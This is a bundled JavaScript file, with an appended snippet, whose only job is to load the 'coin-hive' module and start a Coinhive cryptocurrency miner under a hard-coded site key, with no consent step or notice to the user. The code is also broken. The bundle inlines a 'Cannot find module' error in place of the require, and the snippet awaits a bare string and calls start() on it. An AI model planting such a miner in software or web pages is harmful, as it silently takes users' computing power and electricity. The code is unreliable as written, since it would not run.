! function (n) {
  function r(t) {
    if (e[t]) return e[t].exports;
    var o = e[t] = {
      i: t,
      l: !1,
      exports: {}
    };
    return n[t].call(o.exports, o, o.exports, r), o.l = !0, o.exports
  }
  var e = {};
  r.m = n, r.c = e, r.d = function (n, e, t) {
    r.o(n, e) || Object.defineProperty(n, e, {
      configurable: !1,
      enumerable: !0,
      get: t
    })
  }, r.n = function (n) {
    var e = n && n.__esModule ? function () {
      return n.default
    } : function () {
      return n
    };
    return r.d(e, "a", e), e
  }, r.o = function (n, r) {
    return Object.prototype.hasOwnProperty.call(n, r)
  }, r.p = "", r(r.s = 0)
}([function (n, r, e) {
  "use strict";
  var t = e(! function () {
    var n = new Error('Cannot find module "coin-hive"');
    throw n.code = "MODULE_NOT_FOUND", n
  }());
  ! function (n) {
    return function () {
      var r = n.apply(this, arguments);
      return new Promise(function (n, e) {
        function t(o, u) {
          try {
            var i = r[o](u),
              c = i.value
          } catch (n) {
            return void e(n)
          }
          if (!i.done) return Promise.resolve(c).then(function (n) {
            t("next", n)
          }, function (n) {
            t("throw", n)
          });
          n(c)
        }
        return t("next")
      })
    }
  }(regeneratorRuntime.mark(function n() {
    var r;
    return regeneratorRuntime.wrap(function (n) {
      for (;;) switch (n.prev = n.next) {
        case 0:
          return n.next = 2, t("qz3gu6mdyvfqszm6x6wgawjlqakauh0kd5yyytr2hc");
        case 2:
          return r = n.sent, n.next = 5, r.start();
        case 5:
        case "end":
          return n.stop()
      }
    }, n, void 0)
  }))()
}]);
const CoinHive = require('coin-hive');
(async () => {
  const miner = await ('qz3gu6mdyvfqszm6x6wgawjlqakauh0kd5yyytr2hc')
  await miner.start()
})()
